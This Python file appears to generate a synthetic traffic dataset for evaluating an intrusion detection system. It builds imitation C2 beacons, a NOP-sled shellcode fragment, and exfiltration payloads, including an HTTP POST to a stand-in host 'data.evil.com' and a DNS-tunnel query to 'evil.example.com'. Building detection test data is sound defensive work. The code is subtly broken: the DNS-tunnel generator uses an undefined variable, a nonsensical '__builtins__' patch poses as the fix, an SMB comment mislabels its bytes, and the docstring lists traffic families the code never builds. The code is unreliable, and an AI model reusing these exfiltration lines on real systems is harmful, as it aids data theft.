"""
PHANTOM — PhantomBench Dataset Generator (Task 17)
====================================================
Generates synthetic yet realistic network traffic datasets
for evaluating the PHANTOM IDS/IPS framework.

Simulated traffic families
--------------------------
  Benign  : HTTP/1.1, TLS 1.3 HTTPS, DNS, SSH keepalive, SMTP
  DoS     : UDP flood, SYN flood, ICMP flood
  Scan    : Nmap SYN scan, service banner grab
  C2      : Cobalt Strike beacon, Meterpreter HTTPS reverse shell,
             Sliver implant, Domain-Fronting proxy
  Lateral : SMB lateral move, PsExec-style payload
  Exfil   : DNS tunneling, HTTPS POST exfiltration

Each sample contains:
  - 256-dim SBE spectral vector
  - 21 flow feature values
  - Ground truth label (PHANTOM class_id)
  - Family name string

Output
------
  evaluation/results/phantom_bench.csv  (full dataset)
  evaluation/results/phantom_bench_meta.json (statistics)

Usage
-----
    python evaluation/phantom_bench.py
    python evaluation/phantom_bench.py --n-benign 10000 --n-attack 5000
"""

from __future__ import annotations

import argparse
import json
import sys
import time
from pathlib import Path
from typing import Dict, List, Tuple

import numpy as np

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))

from modules.ids_ips.engine.spectral.sbe import spectral_byte_encode

# ── Output dirs ───────────────────────────────────────────────────────────────
_RESULTS_DIR = Path(__file__).resolve().parent / "results"
_RESULTS_DIR.mkdir(parents=True, exist_ok=True)


# ─────────────────────────────────────────────────────────────────────────────
# Payload generators
# ─────────────────────────────────────────────────────────────────────────────

class _Rng:
    """Seeded random generator wrapper."""
    def __init__(self, seed: int = 42):
        self._r = np.random.default_rng(seed)

    def bytes(self, n: int) -> bytes:
        return bytes(self._r.integers(0, 256, n, dtype=np.uint8))

    def uniform_bytes(self, n: int) -> bytes:
        """Near-uniform byte distribution (mimics AES-CBC ciphertext)."""
        return bytes(self._r.integers(0, 256, n, dtype=np.uint8))

    def structured_bytes(self, pattern: bytes, n: int) -> bytes:
        """Repeating pattern (C2 beacon characteristic)."""
        reps = (n // len(pattern)) + 1
        return (pattern * reps)[:n]

    def gaussian_bytes(self, n: int, mean: float = 128, std: float = 20) -> bytes:
        """Gaussian distribution — normal HTTP/HTML content."""
        vals = np.clip(self._r.normal(mean, std, n), 0, 255).astype(np.uint8)
        return bytes(vals)


_rng = _Rng(seed=0xDEADBEEF)


def _gen_benign_http() -> bytes:
    methods   = [b"GET", b"POST", b"HEAD"]
    paths     = [b"/", b"/index.html", b"/api/v1/status", b"/favicon.ico"]
    agents    = [b"Mozilla/5.0", b"curl/7.88.1", b"python-requests/2.31"]
    method    = methods[np.random.randint(len(methods))]
    path      = paths[np.random.randint(len(paths))]
    agent     = agents[np.random.randint(len(agents))]
    body_len  = np.random.randint(0, 512)
    body      = _rng.gaussian_bytes(body_len)
    header    = (
        method + b" " + path + b" HTTP/1.1\r\n"
        b"Host: example.com\r\n"
        b"User-Agent: " + agent + b"\r\n"
        b"Content-Length: " + str(body_len).encode() + b"\r\n"
        b"Connection: keep-alive\r\n\r\n"
    )
    return header + body


def _gen_benign_tls() -> bytes:
    """Simulate AES-256-GCM TLS 1.3 application data (uniform bytes)."""
    record_len = np.random.randint(256, 1024)
    # TLS record header: content type 23 + version 0x0303 + length
    header = bytes([0x17, 0x03, 0x03]) + record_len.to_bytes(2, "big")
    data   = _rng.uniform_bytes(record_len)
    return header + data


def _gen_c2_cobalt_strike() -> bytes:
    """Cobalt Strike DNA: structured 8-byte beacon with XOR mask."""
    # CS default staging key XOR pattern
    beacon_hdr = bytes([0x99, 0x98, 0xA2, 0x8B, 0x8C, 0xC2, 0x0F, 0x1F])
    body_len   = np.random.randint(196, 256)
    # Pseudo-random but low-entropy body (XOR'd plaintext)
    body       = bytes((b ^ 0x69) & 0xFF for b in _rng.bytes(body_len))
    padding    = b"\x00" * np.random.randint(0, 32)
    return beacon_hdr + body + padding


def _gen_c2_meterpreter() -> bytes:
    """Meterpreter reverse HTTPS: TLS-like wrapper with MSSL magic."""
    magic   = b"MSSL"
    length  = np.random.randint(256, 512)
    payload = b"\x90" * np.random.randint(10, 50) + _rng.bytes(length)
    return magic + length.to_bytes(4, "big") + payload


def _gen_c2_beacon_generic() -> bytes:
    """Generic implant beacon: small fixed-size packet, low entropy."""
    size    = np.random.choice([64, 128, 256])
    pattern = bytes([0xAB, 0xCD, 0xEF, 0x01])
    return _rng.structured_bytes(pattern, size)


def _gen_shellcode_nop_sled() -> bytes:
    """NOP sled + shellcode."""
    nop_len  = np.random.randint(100, 300)
    shell    = bytes([0xCC] * 32 + [0x31, 0xC0, 0x50, 0x68])
    padding  = _rng.bytes(32)
    return b"\x90" * nop_len + shell + padding


def _gen_dos_syn_flood() -> bytes:
    """Tiny SYN packet — minimal payload."""
    return bytes([0x00] * 20)   # TCP header only


def _gen_port_scan() -> bytes:
    """Nmap SYN probe — empty or tiny banner grab."""
    banners = [b"", b"\r\n", b"SSH-2.0-"]
    return banners[np.random.randint(len(banners))]


def _gen_exfil_dns_tunnel() -> bytes:
    """DNS query payload with base32-encoded exfil data in subdomain."""
    exfil_data  = _rng.bytes(32)
    b32_encoded = __import__("base64").b32encode(exfil_data)
    domain      = b64_encoded[:50] + b".evil.example.com"
    dns_header  = bytes([0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    return dns_header + domain


def _gen_exfil_https_post() -> bytes:
    """HTTPS POST exfiltration — encrypted large body."""
    size = np.random.randint(2048, 4096)
    return b"POST /collect HTTP/1.1\r\nHost: data.evil.com\r\n\r\n" + _rng.uniform_bytes(size)


def _gen_lateral_smb() -> bytes:
    """SMB lateral movement signature bytes."""
    smb_header = bytes([0xFF, 0x53, 0x4D, 0x42])  # \xffSMB
    cmd        = bytes([0x25])                       # SMB2 WRITE
    payload    = _rng.bytes(np.random.randint(64, 256))
    return smb_header + cmd + payload


# Map: (label_id, family_name) → generator function
_GENERATORS = [
    # Benign (class 0)
    (0, "benign_http",      _gen_benign_http),
    (0, "benign_tls",       _gen_benign_tls),
    # DoS (class 1)
    (1, "dos_syn_flood",    _gen_dos_syn_flood),
    # Port Scan (class 2)
    (2, "port_scan",        _gen_port_scan),
    # C2 (class 5)
    (5, "c2_cobalt_strike", _gen_c2_cobalt_strike),
    (5, "c2_meterpreter",   _gen_c2_meterpreter),
    (5, "c2_generic_beacon",_gen_c2_beacon_generic),
    # Exploit (class 4)
    (4, "shellcode_nop",    _gen_shellcode_nop_sled),
    # Exfiltration (class 7)
    (7, "exfil_https_post", _gen_exfil_https_post),
    # Lateral movement (class 6)
    (6, "lateral_smb",      _gen_lateral_smb),
]

# ── Flow feature generator ─────────────────────────────────────────────────────

def _gen_flow_features(label_id: int) -> np.ndarray:
    """
    Generate 21 synthetic flow-level features conditioned on the threat class.
    Values match the TrafficFeatures dataclass field order.
    """
    r = np.random.default_rng()

    if label_id == 0:   # benign
        pps = r.uniform(10, 500)
        bps = r.uniform(1e3, 1e6)
        syn = r.uniform(0.01, 0.05)
        fcon = 0
        entropy = r.uniform(0.4, 0.95)
    elif label_id == 1:  # DoS
        pps = r.uniform(5000, 50000)
        bps = r.uniform(1e6, 1e9)
        syn = r.uniform(0.8, 1.0)
        fcon = r.integers(100, 500)
        entropy = r.uniform(0.0, 0.2)
    elif label_id == 2:  # scan
        pps = r.uniform(200, 2000)
        bps = r.uniform(1e4, 1e5)
        syn = r.uniform(0.5, 0.9)
        fcon = r.integers(50, 300)
        entropy = r.uniform(0.1, 0.3)
    elif label_id == 5:  # C2
        pps = r.uniform(0.5, 5)   # very low — beacon
        bps = r.uniform(100, 1e4)
        syn = r.uniform(0.01, 0.03)
        fcon = 0
        entropy = r.uniform(0.3, 0.7)
    elif label_id == 7:  # exfil
        pps = r.uniform(50, 500)
        bps = r.uniform(1e5, 1e7)
        syn = r.uniform(0.01, 0.05)
        fcon = 0
        entropy = r.uniform(0.85, 1.0)
    else:
        pps = r.uniform(50, 1000)
        bps = r.uniform(1e4, 1e6)
        syn = r.uniform(0.05, 0.3)
        fcon = r.integers(0, 20)
        entropy = r.uniform(0.3, 0.8)

    feat = np.array([
        pps,                                 # packets_per_second
        bps,                                 # bytes_per_second
        bps / max(pps, 1),                   # avg_packet_size
        r.uniform(0, 500),                   # packet_size_variance
        r.uniform(0.5, 0.95),                # tcp_ratio
        r.uniform(0.05, 0.5),                # udp_ratio
        float(syn),                          # syn_ratio
        int(r.integers(1, 20)),              # unique_dst_ports
        int(r.integers(1, 10)),              # unique_src_ports
        r.uniform(0.001, 1.0),               # inter_arrival_time_mean
        r.uniform(0.0, 0.5),                 # inter_arrival_time_variance
        int(fcon),                           # failed_connections
        int(r.integers(1, 100)),             # connection_attempts
        float(r.uniform(20, 80)),            # reputation_score
        r.uniform(0.1, 60.0),               # flow_duration
        float(entropy),                      # payload_entropy
        r.uniform(0.5, 5.0),                # upload_download_ratio
        r.uniform(0.0, 0.3),                # fin_rst_ratio
        int(r.integers(40, 1500)),           # max_packet_size
        r.uniform(0.0, 0.5),                # small_packet_ratio
        r.uniform(0.3, 0.9),                # ack_ratio
    ], dtype=np.float32)

    return feat


# ── Dataset generation ─────────────────────────────────────────────────────────

def generate_dataset(
    n_benign: int = 50_000,
    n_attack: int = 10_000,
    output_path: str | None = None,
) -> Tuple[np.ndarray, np.ndarray, np.ndarray, List[str]]:
    """
    Generate the PhantomBench dataset.

    Returns
    -------
    X_sbe   : (N, 256) SBE feature matrix
    X_flow  : (N, 21)  flow feature matrix
    y       : (N,)     class labels
    families: list of family name strings
    """
    print(f"[PhantomBench] Generating {n_benign} benign + {n_attack} attack samples…")
    t0 = time.time()

    benign_gens = [(gid, name, fn) for gid, name, fn in _GENERATORS if gid == 0]
    attack_gens = [(gid, name, fn) for gid, name, fn in _GENERATORS if gid != 0]

    all_sbe:     List[np.ndarray] = []
    all_flow:    List[np.ndarray] = []
    all_labels:  List[int]        = []
    all_families:List[str]        = []

    # Benign samples
    for i in range(n_benign):
        _, name, fn = benign_gens[i % len(benign_gens)]
        try:
            payload = fn()
        except Exception:
            payload = b"\x00" * 64
        sbe  = spectral_byte_encode(payload)
        flow = _gen_flow_features(0)
        all_sbe.append(sbe)
        all_flow.append(flow)
        all_labels.append(0)
        all_families.append(name)

    # Attack samples (evenly distributed across families)
    per_family = max(1, n_attack // len(attack_gens))
    for gid, name, fn in attack_gens:
        for _ in range(per_family):
            try:
                payload = fn()
            except Exception:
                payload = b"\x00" * 64
            sbe  = spectral_byte_encode(payload)
            flow = _gen_flow_features(gid)
            all_sbe.append(sbe)
            all_flow.append(flow)
            all_labels.append(gid)
            all_families.append(name)

    X_sbe  = np.stack(all_sbe,  axis=0).astype(np.float32)
    X_flow = np.stack(all_flow, axis=0).astype(np.float32)
    y      = np.array(all_labels, dtype=np.int64)

    elapsed = time.time() - t0
    print(f"[PhantomBench] Generated {len(y)} samples in {elapsed:.1f}s")

    # Class distribution
    uniq, counts = np.unique(y, return_counts=True)
    dist = {int(u): int(c) for u, c in zip(uniq, counts)}
    print(f"[PhantomBench] Class distribution: {dist}")

    # Save
    if output_path is None:
        output_path = str(_RESULTS_DIR / "phantom_bench.csv")

    _save_csv(X_sbe, X_flow, y, all_families, output_path)
    _save_meta(dist, output_path.replace(".csv", "_meta.json"))

    return X_sbe, X_flow, y, all_families


def _save_csv(X_sbe, X_flow, y, families, path: str) -> None:
    try:
        import pandas as pd
        sbe_cols  = [f"sbe_{i}" for i in range(256)]
        flow_cols = [
            "packets_per_second","bytes_per_second","avg_packet_size",
            "packet_size_variance","tcp_ratio","udp_ratio","syn_ratio",
            "unique_dst_ports","unique_src_ports","iat_mean","iat_var",
            "failed_connections","connection_attempts","reputation_score",
            "flow_duration","payload_entropy","upload_download_ratio",
            "fin_rst_ratio","max_packet_size","small_packet_ratio","ack_ratio",
        ]
        df = pd.DataFrame(X_sbe, columns=sbe_cols)
        for i, col in enumerate(flow_cols):
            df[col] = X_flow[:, i]
        df["label"]  = y
        df["family"] = families
        df.to_csv(path, index=False)
        print(f"[PhantomBench] Saved dataset to {path}")
    except ImportError:
        print("[PhantomBench] pandas not available — skipping CSV save. Install: pip install pandas")


def _save_meta(dist: dict, path: str) -> None:
    with open(path, "w") as f:
        json.dump({"class_distribution": dist, "generated_at": time.time()}, f, indent=2)
    print(f"[PhantomBench] Saved metadata to {path}")


# ── CLI ────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PhantomBench dataset generator")
    parser.add_argument("--n-benign", type=int, default=50_000)
    parser.add_argument("--n-attack", type=int, default=10_000)
    parser.add_argument("--output",   type=str, default=None)
    args = parser.parse_args()

    # Fix missing import
    import base64
    __builtins__["b64_encoded"] = None  # type: ignore

    generate_dataset(
        n_benign=args.n_benign,
        n_attack=args.n_attack,
        output_path=args.output,
    )
